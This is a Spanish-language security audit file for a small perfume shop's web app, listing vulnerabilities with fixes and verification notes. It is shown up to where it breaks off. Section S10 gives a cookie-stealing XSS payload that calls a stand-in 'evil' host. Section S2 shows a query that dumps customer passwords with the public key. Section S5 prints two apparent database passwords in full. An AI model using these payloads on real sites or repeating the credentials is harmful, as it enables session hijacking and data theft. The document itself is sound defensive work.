# SECURITY.md — Inventario de seguridad de ST Perfumería

> **Última actualización:** **Septiembre 17, 2026** — **S2 RESUELTO** (`[BCRYPT-MIGRATION]` · `98b556c` + FASE 1/3 en producción · anon sin acceso directo a `clientes`, bcrypt con migración perezosa, rate-limit server-side). Token de Telegram y chat_id **sacados de este doc** y token rotado (S3 parcial). Regla nueva arriba: los docs no llevan valores de credenciales. S13 nuevo (S2-bis). Antes: 12-ago (`[FOTOS-OREGON]` · S2 medido en 82/78 · S11 arreglado · S12 nuevo).
> **Estado general:** ⚠️ **Hay vulnerabilidades CRÍTICAS pendientes de fix.** Este documento es el ground truth de qué sabemos sobre seguridad del proyecto, qué está roto, qué está OK, y qué planeamos arreglar.
>
> **Audiencia:** Alejo + Claude Code de próximas sesiones. Cuando arranque la sesión `[SECURITY-AUDIT-S1]`, **leer este archivo primero.**

---

## 📏 Regla · los documentos de auditoría NO llevan valores de credenciales

> Un doc de seguridad describe **dónde vive** una credencial (archivo, línea, función SQL, env var), **nunca su valor**. Ni "para documentar la fuga", ni entre comillas, ni parcial. El repo es público y git no olvida: lo que se pega una vez queda en el historial para siempre, y la única salida es rotar la credencial.
>
> Aprendido el 17-sep-2026: § S3 tenía el token real del bot de Telegram y el chat_id escritos completos desde mayo. Se enmascararon y se rotó el token. Vale para `docs/`, `memory/`, `RECOMENDACIONES_CLAUDECHAT/`, commits y chats. Si un valor hace falta para ejecutar algo, se copia **directo** de donde vive (Supabase → Vercel), no por acá. **Vale también para capturas de pantalla** (19-sep: una captura del SQL Editor mostró el token y hubo que rotarlo de nuevo): antes de mandar una imagen, tapar el valor. Y "verificado" para una credencial significa **un uso exitoso** (un mensaje entregado, un login que entra), no un hash del cuerpo de la función.

---

## 🚨 Issues CRÍTICOS · fix URGENTE (1-2 días)

### **S1 · Passwords del admin HARDCODED en HTML público**

**Severidad:** 🔴 CRÍTICA · explotable en 30 segundos por cualquiera con navegador.

**Archivos / líneas exactas:**
- `admin.html` línea **2766:** `var ADMIN_PASS = '<ADMIN_PASS · ver admin.html · S1>';`
- `admin.html` línea **2767:** `var ADMIN_PASS_EMPLEADO = '<ADMIN_PASS_EMPLEADO · ver admin.html · S1>';`

**Cómo explotarlo (esto debe poderse hacer hoy mismo · es trivial):**
1. Cualquiera navega a `https://www.stperfumeria.com/admin.html`
2. Click derecho → "Ver código fuente" (Ctrl+U)
3. Ctrl+F · busca `ADMIN_PASS`
4. Lee los strings en plano
5. Va al login del admin con esa password · entra como jefe o empleado
6. Puede borrar ventas, cambiar stocks, ver datos de clientes, hacer cualquier cosa que las chicas pueden

**Impacto si se explota:**
- Acceso total al panel admin
- Cambiar precios / stock / fotos
- Ver datos de los 38 clientes (teléfonos, historial, puntos)
- Borrar registros de ventas
- Mandar push notifications spam a todos los suscriptores
- Subir fotos arbitrarias al bucket Storage

**Por qué se hizo así originalmente (probable):**
Antes que existiera Supabase Auth, el admin se protegía con un check JS simple (`if (pass === ADMIN_PASS)`). Cuando se migró a Supabase Auth, las constantes quedaron olvidadas. **Hoy las usa el flow nuevo? Hay que verificar:** mirar referencias a `ADMIN_PASS` en el código y ver si todavía se compara con el input del usuario.

**✅ Verificado 27-jun-2026 (durante el test de `[FORGOT-PASS-A]`):**
- Las líneas reales hoy son **L2778-2779** (no L2766-2767 · el archivo creció).
- **El login del admin YA NO usa estas constantes** · autentica contra Supabase Auth (`sb.auth.signInWithPassword`). El comentario en `admin.html` L2775-2777 lo confirma → **no es un login-bypass.**
- **`ADMIN_PASS_EMPLEADO` es código MUERTO** · sólo se declara, nunca se referencia → se puede borrar sin riesgo.
- **`ADMIN_PASS` SIGUE VIVO** · se usa como secreto compartido para llamar a `/api/send-notification` (`admin.html` L7229, validado server-side en Vercel). Al estar en JS público, cualquiera lo lee y puede mandar **push spam a todos los suscriptores**. Borrarlo NO es one-liner: hay que cambiar la auth del endpoint (validar la sesión de Supabase server-side en lugar del string estático) + rotar el secreto en Vercel.
- **Re-scoping de S1:** ya no es "robo de login del panel"; es (a) borrar la var muerta + (b) reemplazar el secreto del push por auth de sesión. Severidad efectiva 🔴→🟠, pero sigue siendo real.

**Fix recomendado (sin tirar pelota nueva):**
1. Eliminar completamente las constantes `ADMIN_PASS` y `ADMIN_PASS_EMPLEADO` del HTML
2. Verificar que el login flow YA usa solo Supabase Auth (`sb.auth.signInWithPassword`) · si depende de las constantes, ahí hay otro bug
3. **Después de eliminar las constantes**, las passwords del admin viven SOLO en `auth.users.encrypted_password` (hash bcrypt) del proyecto Supabase nuevo · NO en el HTML
4. Si las chicas necesitan resetear su password, vamos a darles el flow de "olvidé contraseña" (que también está pendiente · `[FORGOT-PASS-A]`)

**Acción inmediata recomendada por Alejo (antes del audit completo):**
- ⚠️ Considerar **cambiar las passwords del jefe y la empleada YA** (las que están en `auth.users` del proyecto nuevo de São Paulo) porque están expuestas en el HTML público.
- Pasos:
  1. Generar 2 passwords nuevas seguras
  2. Login a Supabase Dashboard del proyecto nuevo
  3. Authentication → Users → seleccionar `jefe@stperfumeria.local` → "Send password recovery" o cambiar directamente
  4. Mismo para `empleado@stperfumeria.local`
  5. Avisar a las chicas las passwords nuevas (por canal privado · NO chat ni email del cliente)
- Una vez hecho · las passwords del HTML (`<ADMIN_PASS · ver admin.html · S1>` y `<ADMIN_PASS_EMPLEADO · ver admin.html · S1>`) ya no abren el admin · gano tiempo para el fix completo.

---

### **S2 · Pass de clientes en plano en tabla `clientes` · ✅ RESUELTO 17-sep-2026**

**Severidad:** 🔴 CRÍTICA · pendiente desde antes (`[BCRYPT-MIGRATION]` documentado en HISTORIA.md).

> ✅ **ESTADO: RESUELTO** · commit `98b556c` (`[BCRYPT-MIGRATION]`, SW v1.1.100) + `sql/fase1.sql` y `sql/fase3.sql` corridos por Alejo en producción el 17-sep-2026. **Escalones 1 y 2 hechos juntos**, como pedía este plan:
> - `anon` **ya no tiene ninguna policy** sobre `clientes` (antes tenía SELECT, INSERT, UPDATE **y DELETE** con `true` — la de DELETE nadie la había relevado). Verificado con la anon key: `GET /rest/v1/clientes?select=telefono` → **0 filas** (antes 98). El panel admin sigue igual con 4 policies nuevas `to authenticated`.
> - El login pasa por `cliente_login(telefono, pass)` (`SECURITY DEFINER`): compara **en el servidor**, y si la clave guardada está en plano y coincide, la reemplaza por **bcrypt cost 10** en ese mismo login (migración perezosa; nadie tuvo que cambiar su clave). Registro y activación guardan hasheado desde el primer segundo. También `cliente_registrar`, `cliente_editar` (ahora exige la clave: antes anon podía cambiar nombre/teléfono de cualquiera), `cliente_puntos`, `cliente_reset_solicitar`.
> - **Rate-limit del lado del servidor** (`cliente_login_intentos`: 5 fallos → 15 min), hash dummy para teléfonos inexistentes (77 ms vs 76 ms: el tiempo no delata qué números existen), mensaje unificado, y la columna `bloqueado` por fin bloquea.
> - Métrica: los hashes suben con cada login (`count(*) filter (where password like '$2%')`). Los 4 clientes sin clave se activan con la primera que escriban.
> - **D verificado por Alejo el 17-sep contra producción**: un cliente con password en texto plano (el caso de 92 de 96) → login `ok` → password pasa a `$2a$10$…` → `crypt(clave, password) = password` true / clave incorrecta false → segundo login contra el hash `ok`. **Los 92 entran con su clave de siempre.**
> - **Queda:** escalón 3 (Supabase Auth) · `cliente_puntos` / `cliente_reset_solicitar` responden con sólo el teléfono (misma exposición que antes: nombre y puntos) · **S13** (abajo) · `[LOGIN-INTENTOS-CLEANUP]`. Detalle de diseño y tropiezos en `docs/HISTORIA.md` § "Sesión 16→17-sep-2026".
>
> Lo que sigue abajo es el análisis original, se conserva como historia.

**Donde está:**
- Tabla `public.clientes` columna `password` (texto plano)
- En el dump pre-migración (D:\backups\st-perfumeria-pre-migracion-20may2026.sql) se pueden ver TODOS los passwords de los 38 clientes en plano · 1 grep y los tenés todos

**Quién puede explotar:**
- Alguien con acceso a la BD via:
  - SQL injection (no la vi pero podría haber)
  - Acceso al dashboard de Supabase (si el password del owner se filtra)
  - Acceso al dump (D:\backups\ o GitHub Release si lo subes)

**Fix recomendado (`[BCRYPT-MIGRATION]`):**
- Implementar lazy migration: cuando un cliente hace login con su password en plano, el server (función SQL) hashea con bcrypt y reemplaza el valor en la columna. La próxima vez compara hash.
- Tras 6 meses, los clientes activos ya están migrados. Los inactivos pueden forzarse via reset.
- Esto está documentado como pendiente desde hace meses. Hoy SIGUE siendo crítico.

**⚠️ Exploitabilidad directa (hallado 27-jun-2026 · agrava S2):**
La tabla `clientes` tiene una policy `SELECT` para el rol `public` con `USING (true)` (policy "Leer clientes"). Como la **anon key vive en el JS público** (`js/app.js` / `admin.html`), cualquiera puede hacer hoy mismo, sin loguearse:

```js
fetch(SUPABASE_URL + '/rest/v1/clientes?select=telefono,password', {
  headers: { apikey: ANON_KEY, Authorization: 'Bearer ' + ANON_KEY }
})
```

y bajarse **TODOS los teléfonos + contraseñas en plano** de los clientes. No hace falta el dump ni acceso al dashboard · la anon key de **producción** alcanza. Esto convierte a S2 en explotable de forma remota y trivial, no sólo "si alguien accede a la BD".

**Por qué no se puede apretar la RLS a secas:** el login del cliente (`js/app.js`) lee `clientes` como `anon` para comparar la pass. Cerrar el `SELECT` público **rompe el login** hasta migrar a Supabase Auth + bcrypt. Por eso el fix va atado a `[BCRYPT-MIGRATION]`, no es un cambio de policy aislado.

**Mitigación posible sin romper login:** mover la verificación de pass a una función `SECURITY DEFINER` (RPC) que reciba `telefono`+`pass` y devuelva sólo un booleano; entonces el `SELECT password` deja de necesitar estar abierto a anon y la policy puede restringir columnas/filas.

#### 📊 Medición real · 12-ago-2026

Ejecutada con la **clave pública** desde el navegador contra producción, sin exponer ningún valor:

| Medición | Resultado |
|---|---|
| ¿`clientes` legible por `anon` sin cuenta? | **Sí** |
| Fichas descargables | **82** (eran 38-40 en mayo · el negocio creció) |
| Contraseñas legibles | **78** |
| Que parecen hash bcrypt (≥55 chars) | **0** |
| En texto plano (<40 chars) | **78** · largos entre 4 y 22 |
| Columnas expuestas | `id`, `nombre`, `telefono`, `password`, `bloqueado`, `puntos`, `compro`, `nota`, `puntos_log` |

**El daño real no es del negocio, es de los clientes:** la gente reutiliza contraseñas, así que la misma clave puede abrir su mail o sus redes. Por eso este es el issue #1 de la lista.

#### 🎯 Plan acordado con Alejo (12-ago) · 3 escalones

| # | Qué | Qué resuelve | Esfuerzo |
|---|---|---|---|
| 1 | **Cerrar la puerta** · RLS cerrada en `clientes` + login por función `SECURITY DEFINER` que devuelva sólo un booleano | Deja de ser explotable por cualquiera desde internet | ~1 h |
| 2 | **Hashear** · bcrypt con migración perezosa (al primer login se reemplaza el plano por el hash) | Aunque alguien llegue a la BD, no se lleva contraseñas usables | ~1-2 h |
| 3 | **Migrar a Supabase Auth** (mismo sistema que ya usa el panel admin) | Deja de mantenerse código propio de seguridad | Sesión dedicada |

⚠️ **Los pasos 1 y 2 van juntos o no van.** El login del cliente hoy lee `clientes` como `anon` para comparar la contraseña: cerrar la policy a secas **deja a todos los clientes afuera**. Hacerlo con el local cerrado y verificando el login antes de dar por terminado.

#### 🚨 Plan de respuesta ANTE una filtración (pedido explícito de Alejo)

1. **Cortar** · rotar la anon key + cerrar la RLS, para que la filtración no siga.
2. **Resetear todas las contraseñas** · `UPDATE clientes SET password = NULL`. El flujo `[FORGOT-PASS-A]` hace que cada cliente defina una nueva la próxima vez que entra, **sin atender a nadie uno por uno**. Es la palanca de emergencia que quedó construida el 27-jun.
3. **Avisar a los clientes** (WhatsApp / redes) con el mensaje que de verdad los protege: *"si usabas esa misma contraseña en otro lado, cambiala"*.
4. **Dejar registro** de qué pasó, qué datos y cuándo. En Argentina rige la ley de protección de datos personales (25.326 · AAIP); avisar a los afectados es lo correcto además de lo que corresponde.

---

## 🟡 Issues ALTOS · fix en 1-2 semanas

### **S3 · Bot token de Telegram + chat_id visibles en función SQL · 🔁 ROTADO 17-sep-2026 · parcialmente abierto por S14**

**Severidad:** 🟡 ALTA · el bot token permite a un atacante mandar mensajes en nombre del bot a cualquier chat al que tenga acceso.

> 🔁 **17-sep-2026 · rotado · 19-sep-2026 · rotado OTRA VEZ y esta vez verificado de verdad.** El token y el chat_id que estaban escritos acá se **enmascararon** el 17-sep (el repo es público y el valor quedó en el historial). Alejo rotó el token en BotFather ese día, pero **el valor quedó mal pegado en `public.send_telegram`**: al copiarlo se arrastró la hora del mensaje de BotFather (`…:54`), 4 caracteres de más → Telegram respondía **404** a todo. **Ningún aviso ni el resumen diario se entregó entre el 18-sep 21:05 y el 19-sep 04:02.** La "verificación por md5 de `prosrc`" sólo probaba que el cuerpo había cambiado, no que el token sirviera: **lo único que verifica un token es un mensaje entregado (`status_code = 200` en `net._http_response`)**. Corregido el 19-sep con un `DO` que valida el formato (`^[0-9]{8,11}:[A-Za-z0-9_-]{35}$`) antes de tocar la función; y como el valor apareció en una captura de pantalla durante el arreglo, **se rotó de nuevo** y se recargó con el mismo `DO`. El vigente vive **sólo** en `public.send_telegram` (y en Vercel cuando se repongan las env vars): no se copia en docs, chats **ni capturas**. `anon` ya no puede invocarla (S14 ✅). Queda el paso a Vault.

**Donde está:**
- Función `public.send_telegram(msg text)` del schema `public` (en BOTH proyectos viejo y nuevo)
- Body de la función:
  ```sql
  bot_token TEXT := '<REVOCADO — ver historial>';   -- el valor real vive SÓLO en public.send_telegram (Supabase) y en Vercel
  chat_id TEXT := '<REVOCADO — ver historial>';
  ```

**Quién puede ver esto:**
- Cualquier user de Supabase con permiso `pg_get_functiondef` (que por default es bastante amplio · incluye el rol `anon` en algunos casos)
- Los usuarios admin (jefe + empleada) si saben SQL
- Cualquiera que tenga el dump pre-migración del paso 0

**Riesgo real:**
- Un atacante puede mandar mensajes spam o phishing al chat_id `<REVOCADO — ver historial>` (Alejo)
- NO puede leer mensajes (Telegram bot API no permite eso al token-poseedor)
- NO puede acceder a otros chats donde el bot no esté

**Fix recomendado:**
1. Mover bot_token y chat_id a **Vault de Supabase** (`vault.secrets`) en el proyecto nuevo
2. Cambiar la función `send_telegram` para que lea de `vault` en lugar de constantes
3. Regenerar el bot_token actual (BotFather → `/revoke` → nuevo token) por las dudas
4. Actualizar el vault con el nuevo token

**Acción inmediata recomendada:**
- ⚠️ Revocar el bot token actual (al pegado en chat varias veces hoy) usando `/revoke` en BotFather de Telegram. Generar uno nuevo.
- Cambiar la función SQL `send_telegram` con el token nuevo.

---

### **S4 · Anon key del proyecto viejo sigue activa**

**Severidad:** 🟡 ALTA · mientras el proyecto viejo de Oregon esté activo (hasta el 28-may como rollback), su anon key sigue funcionando.

**Donde estaba:**
- En `admin.html` y `js/app.js` antes del commit `f532525` · JWT que arranca con `eyJhbGciOiJIUzI1NiIs...`
- Cualquiera que tenga el HTML de versiones anteriores (cacheado en su browser, archivado, etc.) puede usar esa key para leer del proyecto viejo

**Riesgo real:**
- Lectura del catálogo (lo que ya es público)
- ⚠️ Lectura de `clientes` (incluyendo passwords en plano · ver S2)
- Posiblemente otras tablas según RLS policies del viejo

**Fix recomendado:**
- A partir del **28-may-2026** (cuando se baje el proyecto viejo): pausar/borrar el proyecto en Supabase Dashboard. Esto invalida la anon key automáticamente.
- Antes de bajar: regenerar la anon key del viejo en Settings → API → Reset anon key (esto invalida la vieja inmediatamente · pero también rompe el rollback fácil)

**Decisión actual:** mantener anon key activa del viejo por safety net 7 días · aceptar el riesgo limitado (RLS protege la mayoría · clientes.password es el único dato leakeable critically).

---

### **S5 · DB passwords de ambos proyectos expuestas en chat**

**Severidad:** 🟡 ALTA · expuestas en chat de Claude Code de esta sesión (que va al servidor de Anthropic).

**Donde están:**
- DB password del proyecto viejo (`AxOWb4YU8YYVRLrQ`) · pegada en chat para que pueda hacer `pg_dump`
- DB password del proyecto nuevo (`e7SHNHvN68nekCMN`) · pegada en chat para que pueda hacer `psql`

**Quién puede acceder:**
- Anthropic (logs internos de las conversaciones de Claude · políticas estrictas pero técnicamente accesible)
- Cualquiera con acceso al device de Alejo si tiene el chat abierto

**Fix recomendado · ACCIÓN INMEDIATA:**
1. **Resetear DB password del proyecto nuevo** (sa-east-1 São Paulo):
   - Settings → Database → "Reset database password"
   - Generar nueva fuerte
   - **NO necesita rotación adicional** porque la DB password se usa SOLO para conexiones psql/pg_dump directas (que ahora no usamos)
2. **Resetear DB password del proyecto viejo** (us-west-2 Oregon) · idem
   - Pero ojo: si vas a hacer rollback antes de bajar el viejo, vas a necesitar reactivar las conexiones · tal vez postergar este reset hasta el 28-may cuando se vaya a baja

**Sin urgencia · pero hacerlo dentro de 48 horas.**

---

### **S6 · service_role keys de ambos proyectos manejadas en archivos temp**

**Severidad:** 🟡 ALTA · borrados ya, pero pasaron por disco local.

**Estado actual:**
- ✅ `D:\tmp\.env` BORRADO al final de la sesión 21-may
- ✅ `D:\tmp\plan-b-credentials.txt` BORRADO al final de la sesión 21-may
- ✅ Los archivos no se commitearon al repo en ningún momento

**Riesgo residual:**
- Quedan en el espacio libre del disco hasta que el SO sobreescriba esos sectores
- Si alguien tiene acceso físico al disco D:\ y herramientas forenses, puede recuperar los archivos borrados

**Fix recomendado:**
- Si el disco D:\ se va a usar en otra máquina o se va a vender · usar herramienta de borrado seguro (`sdelete -p 3 D:\tmp\.env` antes de borrar)
- Si el disco queda con Alejo · riesgo aceptable

---

### **S10 · Stored XSS · nombre de cliente sin escapar en el panel admin**

**Severidad:** 🟡 ALTA · hallado 27-jun-2026 durante el test de `[FORGOT-PASS-A]`.

**Dónde está:**
- `admin.html` (~L3900) · la tab "Clientes" (`renderClients`) inyecta `c.nombre` directo vía `innerHTML` sin escapar:
  ```js
  + '<div class="client-name">...' + c.nombre + blockedBadge + '</div>'
  ```
- Probablemente otros campos de texto libre del cliente (`c.nota`, `c.telefono2`) comparten el patrón.

**Cómo explotarlo:**
1. Un atacante se registra en el sitio público (signup abierto) con un nombre tipo `<img src=x onerror="fetch('https://evil/?c='+document.cookie)">`.
2. Cuando la chica (jefe o empleada) abre la tab "Clientes" en el panel, ese HTML se ejecuta **en su sesión admin autenticada**.
3. El payload puede robar tokens de sesión de Supabase, ejecutar acciones admin, exfiltrar datos de los clientes, etc.

**Impacto:** ejecución de JS arbitrario en el contexto del panel admin → escalada efectiva a "cualquier cosa que la chica puede hacer".

**Fix recomendado:**
- Escapar TODO texto libre del cliente antes de inyectarlo (`escapeHtml()` ya existe en `admin.html`, L7212). Aplicar en `renderClients` a `nombre`, `nota` y cualquier campo editable por el cliente.
- Auditar TODOS los `innerHTML` del panel que mezclen datos de usuario.
- ✅ En el código nuevo de "Pedidos pass" (commit `eefdfe9`) el nombre YA se escapa · este issue es para los lugares preexistentes.

---

### **S11 · Auth "fail-open" en `/api/send-notification` · ✅ ARREGLADO**

**Severidad:** 🟠 ALTA en potencia · nunca llegó a ser explotable. **Hallado y arreglado el mismo día (12-ago-2026).**

> ✅ **ESTADO: RESUELTO** · commit `ef1507d`. La condición ahora es `if (!ADMIN_PASS || adminPass !== ADMIN_PASS)` → **falla cerrado**: sin la variable configurada, se rechaza todo. Verificado **la lógica** con los 5 casos posibles en Node (sin variable + sin `adminPass` → 401 · sin variable + pass falsa → 401 · con variable + vacía/falsa → 401 · con variable + correcta → permite). ⚠️ **El `401` no se puede observar en producción todavía** porque la función muere al cargar (ver abajo) → **re-testear al hacer `[VERCEL-ENV-VARS]`**. **No requirió bump de SW** (las funciones de `api/` son código de servidor, el SW no las cachea). Se deja documentado abajo el análisis original porque el **patrón** es el aprendizaje, no el caso puntual.

**Dónde está:**
- `api/send-notification.js` L11 y L35:
  ```js
  const ADMIN_PASS = process.env.ADMIN_PASS;   // hoy = undefined
  ...
  if (adminPass !== ADMIN_PASS) {              // undefined !== undefined → false
    return res.status(401).json({ error: 'No autorizado' });
  }
  ```

**El problema:** la comparación **no verifica que `ADMIN_PASS` exista**. Si la variable no está configurada, una petición que simplemente **omita** el campo `adminPass` pasa la validación (`undefined !== undefined` es `false`).

**Por qué hoy no se puede explotar (verificado en producción 12-ago):** la función **ni siquiera arranca**. En `api/send-notification.js` L16-20, `webpush.setVapidDetails(...)` se ejecuta **a nivel de módulo** (fuera del handler) con `VAPID_PUBLIC`/`VAPID_PRIVATE` en `undefined` → `web-push` tira error al cargar el archivo → **todo request devuelve 500 antes de correr una sola línea del handler**. Comprobado con un POST de body vacío contra producción: `500`, no `401` ni `400`. O sea que el agujero **nunca fue alcanzable**; se activaba sólo al reponer las variables.

⚠️ **Consecuencia para la verificación:** mientras no existan las env vars, **el `401` del fix NO se puede observar en producción** (el módulo muere antes). Lo verificado es (a) la lógica de la condición en Node con los 5 casos y (b) que el código está desplegado. **Al ejecutar `[VERCEL-ENV-VARS]`, re-testear este endpoint**: con las variables puestas, un POST sin `adminPass` tiene que dar `401`.

**Cuándo se vuelve peligroso:** el día que se repongan `SUPABASE_URL` + `SUPABASE_SERVICE_KEY` + `VAPID_*` **y se olvide `ADMIN_PASS`**. Ahí el endpoint queda como pasarela abierta: cualquiera puede mandar notificaciones push a **todos los suscriptores** en nombre de ST Perfumería (con un techo de 5 envíos por día por el rate limit).

**Fix aplicado (una línea · fallar cerrado):**
```js
if (!ADMIN_PASS || adminPass !== ADMIN_PASS) {
  return res.status(401).json({ error: 'No autorizado' });
}
```
Se aplicó **antes** de `[VERCEL-ENV-VARS]`, que era el orden seguro. Idealmente, aprovechar y cambiar la auth del endpoint a **sesión de Supabase validada server-side** (eso además cierra S1, porque `ADMIN_PASS` deja de existir en el JS público).

**Patrón a revisar en el resto de las funciones:** cualquier comparación contra una variable de entorno que pueda ser `undefined`. `api/cron/backup.js` **sí lo hace bien** (`const validAuth = CRON_SECRET && auth === 'Bearer ' + CRON_SECRET` · el `&&` lo salva).

---

### **S12 · Vercel sin ninguna variable de entorno · 3 funciones caídas desde mayo**

**Severidad:** 🟡 ALTA como problema operativo (no es una vulnerabilidad en sí, pero rompe el backup propio y habilita S11).

**Estado verificado 12-ago-2026:** `Settings → Environment Variables` del proyecto `st-perfumeria` está **completamente vacío** (pestaña Project). Faltan: `SUPABASE_URL`, `SUPABASE_SERVICE_KEY`, `ADMIN_PASS`, `VAPID_PUBLIC_KEY`, `VAPID_PRIVATE_KEY`, `CRON_SECRET`.

**Consecuencias:**

| Función | Qué hace | Estado |
|---|---|---|
| `api/cron/backup.js` | Backup diario propio a `admin_backups` | ❌ corta con "SUPABASE_URL o SERVICE_KEY no configurados" |
| `api/push-subscribe.js` | Registra suscriptores de notificaciones | ❌ |
| `api/send-notification.js` | Envía el push masivo | ❌ **500 en todo request** · `webpush.setVapidDetails()` corre a nivel de módulo (L16) y explota con las claves en `undefined`, así que la función ni carga |

**Evidencia:** el cron **sí** está declarado en `vercel.json` (`/api/cron/backup`, `0 3 * * *`) y conserva los 12 más recientes, pero `admin_backups` tiene **sólo 4 filas, del 2 al 16 de mayo** → ya fallaba **antes** de la migración. Los logs de Vercel no sirven para confirmar (retención de **1 hora** en plan Hobby).

**Mitigante importante:** los **backups diarios propios de Supabase SÍ funcionan** (`Database → Backups → Scheduled`, con `Restore`, hasta hoy). Los datos del negocio están cubiertos. ⚠️ Pero **no incluyen Storage** → las fotos no están en ningún backup automático (pendiente `[BACKUP-FOTOS-LOCAL]`).

⚠️ **Al reponerlas:** la `SUPABASE_SERVICE_KEY` se copia **directo del dashboard de Supabase al de Vercel**. Nunca por chat, ni a Claude ni a nadie (ver S6).

---

### **S13 · `favoritos`, `votos` y `opiniones` se escriben como `anon` a nombre de cualquier cliente (S2-bis)**

**Severidad:** 🟠 MEDIA-ALTA · hallado el 16-sep-2026 al relevar S2. **Pendiente.**

**Dónde está:** `js/app.js` — `favoritos` (`insert`/`delete` con `user_id: currentUser.id`), `votos` (`upsert`) y `opiniones` (`insert`) corren con la anon key y el `id` que vive en `localStorage.st_cliente`. No hay sesión del lado del servidor: el "login" del cliente es un objeto en localStorage.

**Riesgo real:** cualquiera con la anon key puede escribir favoritos, votos u opiniones **a nombre de otro cliente** si conoce (o adivina) su `id`. Ahora que `clientes` no es legible, los `id` (uuid) ya no se listan — baja mucho la explotabilidad, pero el agujero sigue.

**Fix recomendado:** se resuelve de verdad con el escalón 3 de S2 (Supabase Auth: `auth.uid()` en las policies). Mientras tanto no empeora con S2: las RPC de S2 no devuelven nada que antes no se viera.

---

### **S14 · `[TELEGRAM-ANON-ABIERTO]` · `anon` podía invocar `send_telegram` con texto libre · ✅ RESUELTO 19-sep-2026**

**Severidad:** 🔴 ALTA · hallado el 17-sep-2026 al verificar la rotación del token de S3.

> ✅ **ESTADO: RESUELTO** · `b0cde5e` (SQL: `sql/fase4a_telegram_avisos.sql` + `sql/fase4b_telegram_cerrar.sql`, corridos por Alejo en ese orden) + `5af3d85` (JS) + SW v1.1.102 · 19-sep-2026. Diseño de ClaudeChat, decisión (a) de Alejo: `authenticated` conserva EXECUTE (el panel manda 31 avisos por `notifyTelegram`).
> - Los 5 avisos del sitio público (reset, primer ingreso, bloqueo, perfil editado, lista de espera) los manda **el servidor** desde las RPC de S2 vía `_aviso_tg` (best-effort: `exception when others`, un Telegram caído no tumba un login) y un trigger `after insert` en `lista_espera`. `app.js` ya no tiene `notifyTG`. El aviso de bloqueo pasó de contar en localStorage a contar en el servidor por teléfono, y sale **una sola vez** al cruzar el umbral, con el teléfono enmascarado.
> - `send_telegram`: `revoke all from public` (el ACL real tenía `=X/postgres`: revocar sólo a `anon` no cerraba nada) + `revoke from anon` + `grant` explícito a `authenticated, service_role` + `search_path` fijo, sin tocar el cuerpo.
> - **De yapa, el mismo agujero en `admin_actions_cleanup`**: `SECURITY DEFINER`, borra filas de `admin_actions` (2.625) y era ejecutable por `anon` — cualquiera con la anon key podía purgar la auditoría. Cerrada igual.
> - **Verificado en producción:** `has_function_privilege('anon', …)` → false en las dos · POST anónimo con la anon key a `/rpc/send_telegram` y `/rpc/admin_actions_cleanup` → **401 permission denied** · `cliente_login` sigue 200 · ACL sin `=X/` · `proconfig` con `search_path` en las 4 funciones · **los 5 avisos entregados con `200` en `net._http_response`** (04:03:18 → 04:04:04) · el 6º intento estando bloqueado no volvió a avisar.
> - **Queda:** opción (b) `admin_notificar()` si algún día se quiere cerrar también a `authenticated` · `[S3-VAULT]`.

**Dónde está:** `public.send_telegram(msg text)` es `SECURITY DEFINER` y tiene **EXECUTE para `anon`** (`has_function_privilege('anon', 'public.send_telegram(text)', 'execute')` → `true`). El front la llama con `sb.rpc('send_telegram', { msg })` (`notifyTG` en `js/app.js`) para los avisos de "Primer ingreso" y "Pedido de RESET".

**Riesgo real:** con la anon key (pública, está en `app.js`) cualquiera puede hacer `POST /rest/v1/rpc/send_telegram` con `{"msg": "lo que quiera"}` y el bot lo entrega **en el chat del jefe**: spam, phishing con pinta de aviso del sistema, o simplemente tapar los avisos reales. **Rotar el token no cierra esto**: la función sigue siendo un relay abierto. Además tiene `proconfig` null (sin `search_path` fijo), a diferencia de las `cliente_*` de S2.

**Fix (un parche, en este orden):**
1. Que cada RPC de S2 mande **su propio aviso del lado del servidor**, con el texto armado en SQL: `cliente_login` cuando devuelve `activado` ("Primer ingreso") y `cliente_reset_solicitar` cuando encuentra al cliente ("Pedido de RESET"). Las dos ya saben cuándo corresponde; hoy lo dispara el front.
2. Sacar los `notifyTG` correspondientes de `js/app.js` (bump SW).
3. `revoke execute on function public.send_telegram(text) from anon, authenticated, service_role;` — queda interna, como `_cliente_hash`. Ojo con los *default privileges* de Supabase (ver S2): el revoke tiene que ser explícito por rol.
4. `alter function public.send_telegram(text) set search_path = public, extensions;`
5. Verificar: `has_function_privilege('anon', …)` → `false`, un `POST` anónimo a `/rpc/send_telegram` → 401/403, y que los dos avisos sigan llegando desde las RPC.

---

## 🟢 Issues MEDIOS · revisar pero no urgente

### **S7 · admin.html accesible públicamente · cualquiera puede llegar al login**

**Severidad:** 🟢 MEDIA · no es un issue per se (es necesario para que las chicas accedan), pero combinado con S1 lo agrava.

**Mitigaciones existentes:**
- Lockout escalonado por intentos fallidos (5 intentos → bloqueo escalado en tiempo)
- Telegram notification cuando alguien intenta entrar
- `[LOGIN-RETRY-SP]` reintento silencioso pero NO cuenta timeouts como fallos

**Mitigaciones adicionales propuestas:**
- Path obfuscation: cambiar `admin.html` a `admin-X9k2.html` (security through obscurity · ayuda contra bots automatizados)
- Rate limiting en Vercel/Cloudflare (más robusto)
- Subir contador de fallos a 3 en lugar de 5 (más estricto)
- Email/Telegram alert ANTES del lockout (después de 2 intentos)

---

### **S8 · Bucket Storage `perfume-fotos` con policies muy permisivas**

**Severidad:** 🟢 MEDIA · permite anon upload/delete.

**Donde está:**
- `storage.objects` policies del schema `storage`:
  - `Upload fotos anon` · INSERT TO anon, authenticated
  - `Delete fotos anon` · DELETE TO anon, authenticated
  - `anon puede actualizar fotos perfumes` · UPDATE TO anon, authenticated

**Riesgo real:**
- Un atacante anónimo podría subir/borrar fotos del bucket
- En la práctica, requiere conocer el anon key (que está en el HTML público)
- Combinado con la flexibilidad de filename (sin sanitización), un atacante podría sobreescribir fotos legítimas con fakes

**Por qué se hizo así:**
- El admin sube fotos sin estar logueado en Supabase Auth (usa custom auth de tabla clientes para login admin · pero el INSERT al bucket se hace con anon key del cliente Supabase)
- Por eso las policies permiten anon

**Fix recomendado:**
- Migrar el flow de upload del admin a usar Supabase Auth (que las chicas estén loggeadas en `auth.users` cuando suben fotos)
- Restringir policies a `TO authenticated` solamente
- Agregar check de filename: `bucket_id = 'perfume-fotos' AND name ~ '^[a-zA-Z0-9_-]+\.webp$'` (whitelist)

---

### **S9 · `notifyTelegram` antes del Plan B era estable; post-Plan-B está roto**

**Severidad:** 🟢 MEDIA · funcionalidad rota, no es vulnerabilidad.

**Estado:** `[FIX-TELEGRAM-PG-NET]` pendiente (Task #26). pg_net habilitada en proyecto nuevo pero el worker no procesa requests.

**Workaround propuesto:**
